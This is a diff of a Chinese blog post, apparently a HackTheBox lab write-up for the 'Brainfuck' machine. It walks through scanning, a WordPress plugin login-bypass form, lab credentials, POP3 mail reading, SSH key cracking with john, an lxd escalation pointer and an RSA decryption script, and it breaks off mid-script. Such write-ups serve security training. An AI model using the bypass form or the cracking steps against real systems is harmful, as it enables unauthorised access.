@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;17  10.10.10.17                                                                                                              端口扫描22,25,110,143,443,">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;17  10.10.10.17   端口扫描22,25,110,143,443,ssl证书里得到子域名: 123456789101112131415161718192021222324252627282930313233$ nmap -sC -sV 10.10.10.17Starting Nm">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Brainfuck - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/01/25/Brainfuck-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;17  10.10.10.17                                                                                                              端口扫描22,25,110,143,443,">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;17  10.10.10.17   端口扫描22,25,110,143,443,ssl证书里得到子域名: 123456789101112131415161718192021222324252627282930313233$ nmap -sC -sV 10.10.10.17Starting Nm">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012501.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012502.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012503.jpg">
@@ -125,8 +125,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -148,7 +155,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -216,53 +223,23 @@
 </li>
 <li><h2 id="10-10-10-17"><a href="#10-10-10-17" class="headerlink" title="10.10.10.17"></a>10.10.10.17</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012501.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012501.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,25,110,143,443,ssl证书里得到子域名:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.17</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-25 13:56 CST</span><br><span class="line">Nmap scan report for 10.10.10.17</span><br><span class="line">Host is up (0.069s latency).</span><br><span class="line">Not shown: 995 filtered ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)</span><br><span class="line">|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)</span><br><span class="line">|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)</span><br><span class="line">25/tcp  open  smtp     Postfix smtpd</span><br><span class="line">|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING UIDL USER SASL(PLAIN) TOP CAPA RESP-CODES AUTH-RESP-CODE</span><br><span class="line">143/tcp open  imap     Dovecot imapd</span><br><span class="line">|_imap-capabilities: capabilities OK listed LOGIN-REFERRALS SASL-IR AUTH=PLAINA0001 have LITERAL+ post-login Pre-login more IMAP4rev1 ID IDLE ENABLE</span><br><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.10.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Not valid before: 2017-04-13T11:19:29</span><br><span class="line">|_Not valid after:  2027-04-11T11:19:29</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|_  http/1.1</span><br><span class="line">Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 95.99 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="443"><a href="#443" class="headerlink" title="443"></a>443</h2><p>直接访问是nginx默认页面：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012502.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012502.jpg" alt=""></p>
 <p>那就是加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.17 sup3rs3cr3t.brainfuck.htb www.brainfuck.htb brainfuck.htb</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="brainfuck-htb"><a href="#brainfuck-htb" class="headerlink" title="brainfuck.htb"></a>brainfuck.htb</h2><p>是一个wordpress, 给出一个邮箱地址，并且说明使用了SMTP，前面也有SMTP相关端口开放：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012503.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012503.jpg" alt=""></p>
 <h2 id="sup3rs3cr3t-brainfuck-htb"><a href="#sup3rs3cr3t-brainfuck-htb" class="headerlink" title="sup3rs3cr3t.brainfuck.htb"></a>sup3rs3cr3t.brainfuck.htb</h2><p>sup3rs3cr3t.brainfuck.htb看起来是一个论坛，有注册登录，先放着：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012504.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012504.jpg" alt=""></p>
 <h1 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h1><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p>因为是wordpress，那就直接wpscan,发现一个老版本插件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https://brainfuck.htb --disable-tls-checks</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wp-support-plus-responsive-ticket-system</span><br><span class="line"> | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/</span><br><span class="line"> | Last Updated: 2019-09-03T07:57:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 9.1.2</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 7.1.3 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span><br></pre></td></tr></table></figure>
 
@@ -271,56 +248,21 @@
 <li>WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/41006" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41006</a></li>
 </ul>
 <h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>就是利用这个插件的逻辑漏洞，登录任意用户,administrator没什么用，登录admin进行后续操作：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012505.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012505.jpg" alt=""></p>
 <h2 id="smtp-password"><a href="#smtp-password" class="headerlink" title="smtp password"></a>smtp password</h2><p>在seting -&gt; easy wp smtp里可以看到smtp配置信息。密码隐藏的直接调一下就可以看到：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orestis ： kHGuERB29DNiNE</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012506.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012506.jpg" alt=""></p>
 <h2 id="ticket-html"><a href="#ticket-html" class="headerlink" title="ticket.html"></a>ticket.html</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"https://brainfuck.htb/wp-admin/admin-ajax.php"</span>&gt;</span></span><br><span class="line">	Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"sth"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"loginGuestFacebook"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p>直接使用得到的用户名密码从SMTP获取信息。得到两封邮件内容,其中包括secret forum的用户名密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ncat 10.10.10.17 110</span></span><br><span class="line">+OK Dovecot ready.</span><br><span class="line">USER orestis</span><br><span class="line">+OK</span><br><span class="line">PASS kHGuERB29DNiNE</span><br><span class="line">+OK Logged in.</span><br><span class="line">LIST</span><br><span class="line">+OK 2 messages:</span><br><span class="line">1 977</span><br><span class="line">2 514</span><br><span class="line">.</span><br><span class="line">RETR 1</span><br><span class="line">+OK 977 octets</span><br><span class="line">Return-Path: &lt;www-data@brainfuck.htb&gt;</span><br><span class="line">X-Original-To: orestis@brainfuck.htb</span><br><span class="line">Delivered-To: orestis@brainfuck.htb</span><br><span class="line">Received: by brainfuck (Postfix, from userid 33)</span><br><span class="line">	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)</span><br><span class="line">To: orestis@brainfuck.htb</span><br><span class="line">Subject: New WordPress Site</span><br><span class="line">X-PHP-Originating-Script: 33:class-phpmailer.php</span><br><span class="line">Date: Mon, 17 Apr 2017 17:15:40 +0000</span><br><span class="line">From: WordPress &lt;wordpress@brainfuck.htb&gt;</span><br><span class="line">Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">Your new WordPress site has been successfully set up at:</span><br><span class="line"></span><br><span class="line">https://brainfuck.htb</span><br><span class="line"></span><br><span class="line">You can log in to the administrator account with the following information:</span><br><span class="line"></span><br><span class="line">Username: admin</span><br><span class="line">Password: The password you chose during the install.</span><br><span class="line">Log in here: https://brainfuck.htb/wp-login.php</span><br><span class="line"></span><br><span class="line">We hope you enjoy your new site. Thanks!</span><br><span class="line"></span><br><span class="line">--The WordPress Team</span><br><span class="line">https://wordpress.org/</span><br><span class="line">.</span><br><span class="line">RETR 2</span><br><span class="line">+OK 514 octets</span><br><span class="line">Return-Path: &lt;root@brainfuck.htb&gt;</span><br><span class="line">X-Original-To: orestis</span><br><span class="line">Delivered-To: orestis@brainfuck.htb</span><br><span class="line">Received: by brainfuck (Postfix, from userid 0)</span><br><span class="line">	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)</span><br><span class="line">To: orestis@brainfuck.htb</span><br><span class="line">Subject: Forum Access Details</span><br><span class="line">Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;</span><br><span class="line">Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)</span><br><span class="line">From: root@brainfuck.htb (root)</span><br><span class="line"></span><br><span class="line">Hi there, your credentials for our "secret" forum are below :)</span><br><span class="line"></span><br><span class="line">username: orestis</span><br><span class="line">password: kIEnnfEKJ#9UmdO</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
 
 <h1 id="sup3rs3cr3t-brainfuck-htb-1"><a href="#sup3rs3cr3t-brainfuck-htb-1" class="headerlink" title="sup3rs3cr3t.brainfuck.htb"></a>sup3rs3cr3t.brainfuck.htb</h1><p> 回到前面的论坛，使用得到的账号密码登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012507.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012507.jpg" alt=""></p>
 <p>ssh access里orestis说他的账号锁了，让管理员把key给他，key里是加密通讯：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012508.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012509.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012508.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012509.jpg" alt=""></p>
 <h2 id="vigenere"><a href="#vigenere" class="headerlink" title="vigenere"></a>vigenere</h2><p>注意orestis的签名信息，两篇帖子对应关系,以及url格式：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Orestis - Hacking for fun and profit</span><br><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line"></span><br><span class="line">mnvze:&#x2F;&#x2F;10.10.10.17&#x2F;8zb5ra10m915218697q1h658wfoq0zc8&#x2F;frmfycu&#x2F;sp_ptr 可能是一个URL</span><br><span class="line">mnvze:&#x2F;&#x2F; -&gt; https:&#x2F;&#x2F;</span><br><span class="line">sp_ptr -&gt; id_rsa</span><br></pre></td></tr></table></figure>
 
@@ -330,37 +272,16 @@
 <p>密钥是fuckmybrain：</p>
 </li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012510.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012510.jpg" alt=""></p>
 <p>解出来ssh key下载地址：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;10.10.10.17&#x2F;8ba5aa10e915218697d1c658cdee0bb8&#x2F;orestis&#x2F;id_rsa</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012511.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012511.jpg" alt=""></p>
 <h1 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h1><p>下载下来并不能直接使用，还需要密码,直接john破解出来密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; hash.txt</span><br><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">3poulakia!</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>然后直接ssh登录，用户目录得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012512.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012512.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>提权有不同的方式，预期是密码学，也可以lxd非预期打</p>
 <h2 id="lxd"><a href="#lxd" class="headerlink" title="lxd"></a>lxd</h2><p>当前用户在lxd组中，利用方式：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orestis@brainfuck:~$ id</span><br><span class="line">uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)</span><br></pre></td></tr></table></figure>
@@ -370,14 +291,7 @@
 <li>Ubuntu 18.04 - ‘lxd’ Privilege Escalation - Linux local Exploit<br><a href="https://www.exploit-db.com/exploits/46978" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46978</a></li>
 </ul>
 <h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>当前用户目录还有几个文件，简单看一下可以知道是RSA：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012513.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012513.jpg" alt=""></p>
 <h2 id="debug-txt"><a href="#debug-txt" class="headerlink" title="debug.txt"></a>debug.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br><span class="line">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br><span class="line">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br></pre></td></tr></table></figure>
 
 <h2 id="encrypt-sage"><a href="#encrypt-sage" class="headerlink" title="encrypt.sage"></a>encrypt.sage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nbits &#x3D; 1024</span><br><span class="line"></span><br><span class="line">password &#x3D; open(&quot;&#x2F;root&#x2F;root.txt&quot;).read().strip()</span><br><span class="line">enc_pass &#x3D; open(&quot;output.txt&quot;,&quot;w&quot;)</span><br><span class="line">debug &#x3D; open(&quot;debug.txt&quot;,&quot;w&quot;)</span><br><span class="line">m &#x3D; Integer(int(password.encode(&#39;hex&#39;),16))</span><br><span class="line"></span><br><span class="line">p &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)</span><br><span class="line">q &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">phi &#x3D; (p-1)*(q-1)</span><br><span class="line">e &#x3D; ZZ.random_element(phi)</span><br><span class="line">while gcd(e, phi) !&#x3D; 1:</span><br><span class="line">    e &#x3D; ZZ.random_element(phi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line">enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(p)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(q)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(e)+&#39;\n&#39;)</span><br></pre></td></tr></table></figure>
@@ -390,14 +304,7 @@
 <p>解出来pt decode hex就是root.txt:</p>
 </li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012514.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012514.jpg" alt=""></p>
 <h2 id="solve-py"><a href="#solve-py" class="headerlink" title="solve.py"></a>solve.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x,y, u,v = <span class="number">0</span>,<span class="number">1</span>, <span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b%a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b,a, x,y, u,v = a,r, u,v, m,n</span><br><span class="line">        gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    p = <span class="number">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span></span><br><span class="line">    q = <span class="number">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span></span><br><span class="line">    e = <span 